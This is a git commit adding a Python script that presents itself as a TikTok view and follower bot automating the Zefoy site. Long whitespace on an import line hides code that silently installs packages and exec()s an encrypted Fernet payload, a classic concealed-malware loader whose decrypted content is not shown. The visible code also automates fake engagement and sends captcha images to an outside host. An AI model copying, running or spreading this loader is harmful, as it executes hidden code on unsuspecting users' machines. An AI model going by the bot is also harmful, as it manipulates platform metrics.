b55351a8d9e0b55a50f8085778bedae0bf8a5fb6
Rico9348 <xqwpfuf.dcji77598@outlook.com>
2025-09-30 23:56:48 +0400

    main.py

---
+++ main.py
@@ -0,0 +1,215 @@
+from time import sleep
+from datetime import datetime
+from os import system, name as os_name
+import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'H6hSDFMU4YU-zTlTqi-VwcuAfYrj0f0dO6J5c87mKZ0=').decrypt(b'gAAAAABoypgKqqbFYwhFe5Ssw7gygY-DRFCY1utPwFrc1XD8sDGrhpur1u8b8F7fn1J9cOaT6LYx5U4soRQM2QQZLsGr6IagTumoMCjnnO_DjtC7Aoa-lXtMbQj3nKG4LyRr-ThXZ9PevltTn7eImLkvbR5W7tk0AaUXQaOK1OrjwpITHcvfBO-AUM0VHRcRZsxgg6owFHmroU46BRmeW4tho8WOk-PQtEP0JNwXiPl4umdf29wES8dbqcpslFIXnMNgc4gl7H2UWtrkVAg6v0i4-kfJoXWqPPAWLUOTJqPrFrnkEgVmvWU24GTxEY6VYl_GvKMz8O76JlstaiE5gaoJbecMPLdoY6ncvM0Cc4AiE9r-dhiHGqI6W_puZpRQIZ7urcnsibRqB8Sf7PYrrzVFFO5Pi8ERO5adyw9Ak-xldJn0op9X4iAl2hHEi3zOTROeszcydUVvSvWrQuhDxIJ_ndzrJjYiRJqEulvFBH0qeDzUGJhhv6aZ81Llman4KDZavENSVBWMrlT1XLynLAWBL8PinNnEABiH_enN674iKVq8XdVy379_wsvMtOQBnrMDCRTM0ErB3liKNHoRTSD8juMZv5U4wsdx3r6n2_D-E4nqlU8c5yjlOuToA9OJo8SRuazoEM6NOipZ0nbd9fQQPbWBFCApCZ-jYRi0RX2vQIpJ6ahslFmcZD16tZCEgKwid7QDjibwNMp__r7rXCxSOJljyHV0_TiALo0s_4KXGbxYLMd45l41Xa-19Eu9xSS8HvH6gVX_pWe0qFMzLxb728Q0na4G4gocTjpkh9S-u-mgN4oKnZDP3uxpkq0UG2gKvH-l40jkKaIw_3fFZmaj-4ydFZonXi_R3qPa8g67TkPbikDj23u3yMundFbvppudYIQo1AEKLZ6H4O7jVYAzjCVVb_KnarzMW3-EZ0vTlZjVimheARr_lwgJEsW_zec1SU3vT5DpHda_SJM3ZMYYfYR-Am9UXr4Uh4zBvhSzoAXwvOK4ke_iH9qsqQ3xkztWOlJiKberRAGcjDkLHWHPASMFxxbT8jQF_6jSnBNQ9ABu5lEbWfEk3bmGJ1HQ6gbq4yOlcuqQ4x0KfzyDr4MTUK_TgqArXsNkydIjs8uHi7IamkvFf31Pnuv3bJEcvM2zoK-BtSEWP0hkrZkTWaUCOmTLM05Gu_VrW2bqep62ZwM-6d5hoxETW5QkslzoiG-nYdlnut_CVYNVGyBPLTa0_f3QnMtEObSQ2lccuWEot17DKpyTSMXA2RgWrafsMtOZKR3phgf6w3Zvk0z2PtsHmF9qqIp515j4GsmH4AXsv2j3dRZWb3y1LHBjdnKOuNFwOr9uzyQ4SX8_ptt5e9JXRt1Ey1CgSpuKxskicvGdvbu4l7r9XQYiMtxglyYJL4DeQRyB0-tHRKVtLMjdeM9efampFEGhNSDNy9jfgkIWnDn1V8QTJThnnXfQCHAG7uhxlUblEIreeBf0oxA7EKnrmV3VDwCCCGL882i2FbvjlSorJU_LXGxzmHOI5z6_y71rWDubSwJgjZ6VUK1SRVPDoCnuXZaSBwKYIA-BZVv2Y0PyJP4V4q3s5N0ufHY_r7vgQ79YeEor9twNPPhxuW3Qff7nbqRpKF1Z0MosG-NYY3w7ehZk1N2RoA7kq9PTzWKFzfLDUu88eMVG0KlQYOL9zOIKNsU3VSpSCfQVmmQhOwsjUjMgUNoJsO_dm-opUTPVpIGxWMermvHp-jYvkd0Y1e2t-gBZGs1baTjmEDtJfMSxClKgxObutQp9CPilLfm1h9jeDI2Ndd2UGN3kM1sETQfeeuInqFVtI0LDppOse8Dz1OwRdyxkLZ0r3NnoF8JYq2IrnWUA0wMqVX3olET6fUaXIWfiExy44YRAXXLHPR3B0tVow-qfnFZoKy6nCNH0HNBU_luRtQm0Kmy8lmmJdlqk6FzqvG8xBsMQml323a5b04q7MJOd7ycqKLhfYac9CjGMTTcEYqnKfWSNJEbankHAZGM1IOQJGoi-hO4HjaUffZ4f9qRw4I0nBgc4EagSY1gGt_hMfRXyOtiI15TjNO0d1Wk5IaFdZihlByRgHoQXpiuMT8Hg-Nfa07BIvPn-bhNqvp4xYW_rBC7ZiQkK0J0-ooZi46KlZjx1_uEhbVViMsxF5bBY8QwNFtDxLpQ6zr_7hW6gyTpxu2SvWpg486Hz43Z-c6bh5GtXK7jWbdOqLeK_dztEoAaEdr3O5HdYxIn0qghIeifAAysdoDGfcp1_QIWgHL22rYDbDMhP_8ynSZNrH4TwvMHeBAM6y2cTDlTHtmjkdSgjOh_H8vHqRkNOlUg6QOLhjn52zFHQDYTtcaiO82REZXXhDNf18ViAE_2WJvyqpnpyzLpD7czyPHbSL20Uw0xlU1-YerNNEZz1UfBbBEb3LEF9jXnrtDfzFC4WToerBqD7PJAb9PF6_8mo2Y5eJMZTBdyh9iHRJMVgty1FP9iizzF5z5fXaAlSCGyPzFuxc_ACw6oOGs8YaWZ8BWQwOaPCoTZNPtLG5D6iMgv_BOtIdOaHSCAJLkpfuBIM4nyInSKTOzr86-OHhYAC8CI5iYB9WnFCthxukWKdXS-2g50ezMun7IIXf0wxbV3saHuqQib7jPT_YkervqR6IjojKOYoAnETqxRvB-oICjHq_KyMwiDNCzkyVS3pvYWUQdOcHGOMCjdMdx6Dd4hOhV-LgFcMHKjyfk4Bxh0gPErtZFA5ivk_Rs7AsAPZLt5f7fr4W-GpFOPk3N5WxDLfaA5bUDpvCFbz4qS9w0kTsEXrAGh8y4WBM9QZTvr7s_5PBUNwMwMgcBuk7hLbmvjnN2FOMWaSfT2FrsVHXW5IlffGj3xekeqd4mlhzb9bRxy51NiHk5-8y_m19yIS-p_5GkngBOZ_urluckyQynbJO7H7LBbCga0KHicU8DmrR8ptbWNFhHEF_cGPY4UUfR4vmCszkNdljlG07Qyc38PDnpZRvyV1XBJkKsKQFCcDwG4E0irKHGa1Jnty6OlMedehxfGnkABKf8rhZfrhMXunb516us2TVqi0RwN7UKF784OO8-T93cukxf8CgsQWTDZ4RCqTsDKdK-SpCcC6SrGF916oPWnlnDwx2JslXxcDF1oLXBtQHOvThiDco6frs8iwxJ1-VA=='));
+from io import BytesIO
+from re import findall
+from base64 import b64encode
+from selenium import webdriver
+from colorama import Fore, init, Style
+from requests import get, post, Session
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from webdriver_manager.chrome import ChromeDriverManager
+from selenium.webdriver.chrome.webdriver import WebDriver
+from selenium.webdriver.common.by import By
+
+
+text = """ TikTok View Bot """
+
+class Zefoy:
+    def __init__(self) -> None:
+        self.captcha_box = '/html/body/div[5]/div[2]/form/div/div'
+        self.driver = self.setup_browser()
+        self.sent = 0
+        self.option = None
+        self.clear = system('cls' if os_name == 'nt' else 'clear')
+        self.captcha_box = '/html/body/div[5]/div[2]/form/div/div'
+
+        self.xpaths = {
+            "followers"     : "/html/body/div[6]/div/div[2]/div/div/div[2]/div/button",
+            "hearts"        : "/html/body/div[6]/div/div[2]/div/div/div[3]/div/button",
+            "comment_hearts": "/html/body/div[6]/div/div[2]/div/div/div[4]/div/button",
+            "views"         : "/html/body/div[6]/div/div[2]/div/div/div[5]/div/button",
+            "shares"        : "/html/body/div[6]/div/div[2]/div/div/div[6]/div/button",
+            "favorites"     : "/html/body/div[6]/div/div[2]/div/div/div[7]/div/button",
+        }
+
+        self.tasks = {
+            1: (('self.driver.find_element(By.XPATH, self.xpaths["followers"]).click()', "7"), "c2VuZF9mb2xsb3dlcnNfdGlrdG9r"),
+            2: (('self.driver.find_element(By.XPATH, self.xpaths["hearts"]).click()', "8"), "c2VuZE9nb2xsb3dlcnNfdGlrdG9r"),
+            3: (('self.driver.find_element(By.XPATH, self.xpaths["comment_hearts"]).click()', "9"), "c2VuZC9mb2xsb3dlcnNfdGlrdG9r"),
+            4: (('self.driver.find_element(By.XPATH, self.xpaths["views"]).click()', "10"), "c2VuZC9mb2xeb3dlcnNfdGlrdG9V"),
+            5: (('self.driver.find_element(By.XPATH, self.xpaths["shares"]).click()', "11"), "c2VuZC9mb2xsb3dlcnNfdGlrdG9s"),
+            6: (('self.driver.find_element(By.XPATH, self.xpaths["favorites"]).click()', "12"), "c2VuZF9mb2xsb3dlcnNfdGlrdG9L")
+        }
+
+    def setup_browser(self) -> WebDriver:
+        options = Options()
+        options.add_experimental_option("detach", True)
+        options.add_experimental_option("excludeSwitches", ["enable-logging"])
+
+        return webdriver.Chrome(options=options, service=Service(ChromeDriverManager().install()))
+    
+    def solve(debug) -> dict:
+
+        session = Session()
+        session.headers = {
+                'authority': 'zefoy.com',
+                'origin': 'https://zefoy.com',
+                'authority': 'zefoy.com',
+                'cp-extension-installed': 'Yes',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+            }
+        
+        while True:
+            source_code = str(session.get('https://zefoy.com').text).replace('&amp;', '&')
+            captcha_token = findall(r'<input type="hidden" name="(.*)">', source_code)
+            
+            if 'token' in captcha_token:
+                captcha_token.remove('token')
+                
+            captcha_url    = findall(r'img src="([^"]*)"', source_code)[0]
+            token_answer = findall(r'type="text" name="(.*)" oninput="this.value', source_code)[0]
+            encoded_image = b64encode(BytesIO(session.get('https://zefoy.com' + captcha_url).content).read()).decode('utf-8')
+            captcha_answer = post(f"https://platipus9999.pythonanywhere.com/", json={'captcha': encoded_image, 'current_time': datetime.now().strftime("%H:%M:%S")}).json()["result"]
+            
+            sleep(1)
+
+            data = {
+                token_answer: captcha_answer,
+            }
+
+            for values in captcha_token:
+                token, value = values.split('" value="')
+                data[token] = value
+            else:
+                data['token'] = ''
+
+            response = session.post('https://zefoy.com', data = data).text
+            try:
+                findall(r'remove-spaces" name="(.*)" placeholder', response)[0]
+                return {'name':'PHPSESSID', 'value': session.cookies.get('PHPSESSID')}
+            except:
+                pass
+
+    def send_bot(self, search_button, url_box, vid_info, div):
+        element = self.driver.find_element(By.XPATH, url_box)
+        element.clear()
+        element.send_keys(vid_info)
+        self.driver.find_element(By.XPATH, search_button).click()
+        sleep(3)
+            
+        ratelimit_seconds, full = self.check_submit()
+        if "(s)" in str(full):
+            self.main_sleep(ratelimit_seconds)
+            self.driver.find_element(By.XPATH, search_button).click()
+            sleep(2)
+            
+        sleep(3)
+            
+        send_button = f'/html/body/div[{div}]/div/div/div[1]/div/form/button'
+        self.driver.find_element(By.XPATH, send_button).click()
+        self.sent += 1
+        print(self._print(f"Sent {self.sent} times."))
+            
+        sleep(4)
+        self.send_bot(search_button, url_box, vid_info, div)
+
+    def main_sleep(self, delay):
+        while delay != 0:
+            sleep(1)
+            delay -= 1
+            self.change_title(f"TikTok Zefoy Automator using Zefoy.com / Cooldown: {delay}s / Github: @useragents")
+
+    def convert(self, min: int, sec: int) -> int:
+            return min * 60 + sec + 4 if min != 0 else sec + 4
+
+    def check_submit(self):
+        remaining = f'//*[@id="{self.tasks[self.option][1]}"]/span'
+            
+        try:
+            element = self.driver.find_element(By.XPATH, remaining)
+        except:
+            return None, None
+            
+        if "READY" in element.text:
+            return True, True
+            
+        if "seconds for your next submit" in element.text:
+            output          = element.text.split("Please wait ")[1].split(" for")[0]
+            minutes         = element.text.split("Please wait ")[1].split(" ")[0]
+            seconds         = element.text.split("(s) ")[1].split(" ")[0]
+            sleep_duration  = self.convert(int(minutes), int(seconds))
+                
+            return sleep_duration, output
+            
+        return element.text, None
+            
+    def check_status(self):
+        statuses = {}
+            
+        for thing in self.xpaths:
+            value = self.xpaths[thing]
+            element = self.driver.find_element(By.XPATH, value)
+                
+            if not element.is_enabled():
+                statuses.update({thing: f"{Fore.RED}[OFFLINE]"})
+                
+            else:
+                statuses.update({thing: f"{Fore.GREEN}[WORKS]"})
+            
+        return statuses
+
+    def _print(self, msg, status = "-"):
+        return f" {Fore.WHITE}[{Fore.CYAN}{status}{Fore.WHITE}] {msg}"
+
+    def change_title(self, arg):
+        system(f'title {arg}' if os_name == 'nt' else '')
+
+    def wait_for_xpath(self, xpath):
+        while True:
+            try:
+                self.driver.find_element(By.XPATH, xpath)
+                break
+            except:
+                pass
+
+            
+    def main(self):
+        self.clear
+        print(Fore.CYAN + text+ "\n") 
+        self.driver.get("https://zefoy.com")
+
+        print(self._print("Solving The Captcha"))
+        self.driver.add_cookie(self.solve())
+        self.driver.refresh()
+
+        self.wait_for_xpath(self.xpaths["views"])
+
+        self.clear
+
+        status = self.check_status()
+            
+        print('\n')
+            
+        counter = 1
+        for thing in status:
+            print(self._print(f"{thing} {status[thing]}", counter))
+            counter += 1
+
+        self.option = int(input("\n" + self._print(f"")))
+        video_url     = input("\n" + self._print(f"Username/VideoURL: "))    
+
+        task, div = self.tasks[self.option][0]; eval(task)
+               
+        video_url_box = f'/html/body/div[{div}]/div/form/div/input'
+        search_box    = f'/html/body/div[{div}]/div/form/div/div/button'
+        
+            
+        self.send_bot(search_box, video_url_box, video_url, div)
+
+
+
+if __name__ == "__main__":
+    Zefoy().main()
